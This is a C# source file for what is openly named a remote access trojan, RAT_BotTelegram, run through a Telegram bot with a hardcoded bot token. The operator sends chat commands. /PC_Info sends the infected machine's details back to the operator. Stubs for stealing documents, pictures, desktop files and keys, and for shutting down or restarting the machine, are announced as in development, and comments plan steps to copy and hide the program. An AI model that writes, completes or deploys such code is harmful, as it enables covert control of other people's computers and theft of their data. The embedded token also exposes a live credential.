﻿using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Threading.Tasks;
using Telegram.Bot;
using RAT_BotTelegram.Lib;
using Telegram.Bot.Types;

namespace RAT_BotTelegram {
    class Program {
        static CommandsFeatures fea = new CommandsFeatures();
        private static readonly TelegramBotClient Bot = new TelegramBotClient("1159435940:AAHKZLqDuuk4XBYHUx2GmQei0-RoRvis2v8");
        static void Main(string[] args) {


           // Console.WriteLine(.getBitVersion());


            // Copiar
            // Esconder

            // Mensaje de conexión 
            Bot.OnMessage += Bot_OnMessage;
            Bot.OnMessageEdited += Bot_OnMessage;

            // Escucha servidor
            Bot.StartReceiving();
            
            Console.ReadLine();
            Bot.StopReceiving();
        }

        


        private static void Bot_OnMessage(object sender, Telegram.Bot.Args.MessageEventArgs e) {
            
            if (e.Message.Type == Telegram.Bot.Types.Enums.MessageType.Text) {

                if (e.Message.Text == "/PC_Info") {
                    Bot.SendTextMessageAsync(e.Message.Chat.Id, fea.PC_Info());
                } else if (e.Message.Text == "/PC_ShutDown") {
                    Bot.SendTextMessageAsync(e.Message.Chat.Id, "Se está desarrollando... Espere las proximas actualizaciones");
                } else if (e.Message.Text == "/PC_Restart") {
                    Bot.SendTextMessageAsync(e.Message.Chat.Id, "Se está desarrollando... Espere las proximas actualizaciones");
                } else if (e.Message.Text == "/Get_Document") {
                    Bot.SendTextMessageAsync(e.Message.Chat.Id, "Se está desarrollando... Espere las proximas actualizaciones");
                } else if (e.Message.Text == "/Get_Music") {
                    Bot.SendTextMessageAsync(e.Message.Chat.Id, "Se está desarrollando... Espere las proximas actualizaciones");
                } else if (e.Message.Text == "/Get_Download") {
                    Bot.SendTextMessageAsync(e.Message.Chat.Id, "Se está desarrollando... Espere las proximas actualizaciones");
                } else if (e.Message.Text == "/Get_Videos") {
                    Bot.SendTextMessageAsync(e.Message.Chat.Id, "Se está desarrollando... Espere las proximas actualizaciones");
                } else if (e.Message.Text == "/Get_Pictures") {
                    Bot.SendTextMessageAsync(e.Message.Chat.Id, "Se está desarrollando... Espere las proximas actualizaciones");
                } else if (e.Message.Text == "/Get_Desktop") {
                    Bot.SendTextMessageAsync(e.Message.Chat.Id, "Se está desarrollando... Espere las proximas actualizaciones");
                } else if (e.Message.Text == "/Get_Key") {
                    Bot.SendTextMessageAsync(e.Message.Chat.Id, "Se está desarrollando... Espere las proximas actualizaciones");
                } else if (e.Message.Text == "/Test") {
                    Bot.SendTextMessageAsync(e.Message.Chat.Id, "Se está desarrollando... Espere las proximas actualizaciones");
                } else if (e.Message.Text == "/elseif") {
                    Bot.SendTextMessageAsync(e.Message.Chat.Id, "Se está desarrollando... Espere las proximas actualizaciones");
                } else if (e.Message.Text == "/3") {
                    Bot.SendTextMessageAsync(e.Message.Chat.Id, "Se está desarrollando... Espere las proximas actualizaciones");
                } else {
                    Bot.SendTextMessageAsync(e.Message.Chat.Id, @" Use los siguientes comandos: 
                    /PC_Info
                    /PC_ShutDown  <Está en desarrollo>
                    /PC_Restart   <Está en desarrollo>
                    /Get_Document <Está en desarrollo>
                    /Get_Music    <Está en desarrollo>
                    /Get_Download <Está en desarrollo>
                    /Get_Videos   <Está en desarrollo>
                    /Get_Pictures <Está en desarrollo>
                    /Get_Desktop  <Está en desarrollo>
                    /Get_Key      <Está en desarrollo>
                    /Test         <Está en desarrollo>
                    /Get_Document <Está en desarrollo>
                    /Get_Document <Está en desarrollo>
                    /Get_Document <Está en desarrollo>
                    /Get_Document <Está en desarrollo>
                    /Get_Document <Está en desarrollo>
                    /Get_Document <Está en desarrollo>
                    /Get_Document <Está en desarrollo>
                    /Get_Document <Está en desarrollo>
                    /Get_Document <Está en desarrollo>
                    ");
                }




            }
                
        }
    }
}